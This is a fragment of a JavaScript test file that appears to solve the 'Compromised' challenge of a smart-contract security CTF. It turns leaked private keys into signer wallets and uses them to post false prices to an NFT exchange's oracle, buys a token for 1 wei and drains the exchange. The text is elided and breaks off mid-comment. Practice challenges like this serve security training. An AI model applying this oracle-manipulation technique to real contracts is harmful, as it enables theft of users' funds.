...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    const CompromisedSigners = [
      ...
      return new ethers.Wallet(privateKeyHex, ethers.provider);
    });
    const oracle = this.oracle;
    async function changePriceTo(to) {
      for (let i = 0; i < CompromisedSigners.length; i++) {
        await oracle.connect(CompromisedSigners[i]).postPrice("DVNFT", to);
      }
    }

    // Changing price to 1 wei
    await changePriceTo(1);
    await this.exchange.connect(attacker).buyOne({ value: 1 });
    const tokenId = 0;

    // Changing price to exchange balance
    await changePriceTo(
    ...
    await changePriceTo(INITIAL_NFT_PRICE);
    // We need only mid signer becouse price will be depen
  });
